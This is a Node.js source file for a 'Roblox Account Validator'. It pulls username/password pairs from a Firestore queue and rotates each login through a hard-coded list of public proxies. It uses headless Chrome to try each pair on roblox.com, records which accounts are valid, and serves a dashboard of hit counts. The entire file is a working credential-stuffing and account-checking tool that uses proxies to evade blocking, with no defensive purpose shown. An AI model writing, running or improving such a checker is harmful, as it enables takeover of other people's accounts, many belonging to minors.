// ============================================================
//  Roblox Account Validator — EXACT BLUEPRINT IMPLEMENTATION
// ============================================================

const express = require("express");
const cors = require("cors");
const path = require("path");
const admin = require("firebase-admin");
const { chromium } = require("playwright");

// ── Firebase Setup ───────────────────────────────────────────
let serviceAccount;
if (process.env.FIREBASE_CONFIG) {
  serviceAccount = JSON.parse(process.env.FIREBASE_CONFIG);
} else {
  serviceAccount = require("./oren-devs-firebase-adminsdk.json");
}

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
});

const db = admin.firestore();

// ── Express App ──────────────────────────────────────────────
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// ── Stats Tracking ───────────────────────────────────────────
let stats = {
  processed: 0,
  valid: 0,
  invalid: 0,
  queue: 0,
  processing: 0,
};

// ── Proxy List ───────────────────────────────────────────────
const PROXY_LIST = [
  "http://20.210.113.32:80",
  "http://154.16.63.190:80",
  "http://67.43.228.253:25803",
  "http://103.153.154.6:80",
  "http://47.74.152.29:8888",
];

// ── Selectors ────────────────────────────────────────────────
const SELECTORS = {
  username: "#login-username",
  password: "#login-password",
  submit: 'button[type="submit"]',
  error: ".error, .alert, [class*=\"error\"], [class*=\"invalid\"]",
  settings: "span#nav-settings",
  logout: "a.rbx-menu-item.logout-menu-item",
};

// ── Validate Credential Function ─────────────────────────────
async function validateCredential(doc) {
  const { id } = doc;
  const { username, password } = doc.data();
  let browser = null;

  try {
    stats.processing = 1;
    // 1. Pick RANDOM proxy from list
    const proxy = PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
    console.log(`[${username}] Using proxy: ${proxy}`);

    // 2. Launch HEADLESS Chrome
    browser = await chromium.launch({
      headless: true,
      args: ["--no-sandbox", `--proxy-server=${proxy}`],
    });

    const context = await browser.newContext();
    const page = await context.newPage();

    // 3. Go to login page
    await page.goto("https://roblox.com/login");

    // 4. Wait for selector
    await page.waitForSelector(SELECTORS.username, { timeout: 10000 });

    // 5. Fill username
    await page.fill(SELECTORS.username, username);

    // 6. Fill password
    await page.fill(SELECTORS.password, password);

    // 7. Click submit
    await page.click(SELECTORS.submit);

    // 8. Wait for network idle
    await page.waitForLoadState("networkidle");

    // 9. CHECK
    const hasError = await page.$(SELECTORS.error);
    const hasSettings = await page.$(SELECTORS.settings);

    stats.processed++;
    if (hasError || !hasSettings) {
      // 10. IF error EXISTS OR settings NULL: UPDATE FIREBASE invalid
      console.log(`[${username}] Result: INVALID`);
      stats.invalid++;
      await db.collection("credentials").doc(id).update({
        status: "invalid",
        processed_at: admin.firestore.FieldValue.serverTimestamp(),
      });
    } else {
      // 11. IF settings EXISTS: Logout and UPDATE FIREBASE valid
      console.log(`[${username}] Result: VALID`);
      stats.valid++;
      await page.click(SELECTORS.settings);
      await page.waitForSelector(SELECTORS.logout, { timeout: 5000 });
      await page.click(SELECTORS.logout);
      
      await db.collection("credentials").doc(id).update({
        status: "valid",
        processed_at: admin.firestore.FieldValue.serverTimestamp(),
      });
    }
  } catch (err) {
    console.error(`[${username}] Error:`, err.message);
    await db.collection("credentials").doc(id).update({
      status: "error",
      error_message: err.message,
      processed_at: admin.firestore.FieldValue.serverTimestamp(),
    });
  } finally {
    stats.processing = 0;
    // 12. browser.close()
    if (browser) await browser.close();
  }
}

// ── Main Validator Loop ──────────────────────────────────────
async function mainValidatorLoop() {
  console.log("--- Validator Loop Tick ---");
  try {
    // 1. Update queue count (all documents with status "pending")
    const pendingSnapshot = await db.collection("credentials")
      .where("status", "==", "pending")
      .get();
    stats.queue = pendingSnapshot.size;

    // 2. Find FIRST document where status = "pending", ordered by when it was added
    const snapshot = await db.collection("credentials")
      .where("status", "==", "pending")
      .orderBy("added_at", "asc")
      .limit(1)
      .get();

    if (snapshot.empty) {
      console.log("No pending documents found. Waiting 10s...");
    } else {
      const doc = snapshot.docs[0];
      console.log(`Found pending document: ${doc.id} (${doc.data().username})`);
      
      // Mark as "processing" to prevent race conditions
      await db.collection("credentials").doc(doc.id).update({ status: "processing" });
      
      await validateCredential(doc);
    }
  } catch (err) {
    console.error("Error in validator loop:", err.message);
  }

  // 3. Repeat every 10 seconds
  setTimeout(mainValidatorLoop, 10000);
}

// ── REST API Endpoints ────────────────────────────────────────

// API for Dashboard Stats
app.get("/api/stats", (req, res) => {
  res.json({
    ...stats,
    uptime_human: Math.floor(process.uptime()) + "s",
    server_time: new Date().toISOString(),
    system_health: {
      tier_found: "Free",
      browser_path: "/usr/bin/google-chrome",
    }
  });
});

// API for Recent Validations
app.get("/api/recent", async (req, res) => {
  try {
    const snapshot = await db
      .collection("credentials")
      .where("status", "in", ["valid", "invalid", "error"])
      .orderBy("processed_at", "desc")
      .limit(10)
      .get();

    const recent = snapshot.docs.map(doc => ({
      id: doc.id,
      ...doc.data(),
      processed_at: doc.data().processed_at ? { _seconds: doc.data().processed_at.seconds } : null
    }));

    res.json(recent);
  } catch (err) {
    console.error("Error fetching recent:", err.message);
    res.json([]);
  }
});

app.get("/health", (req, res) => {
  res.json({ status: "ok", uptime: process.uptime() });
});

app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// ── Start Server ─────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🔄 Main Validator Loop started (10s interval)`);
  
  // Start the loop
  mainValidatorLoop();
});
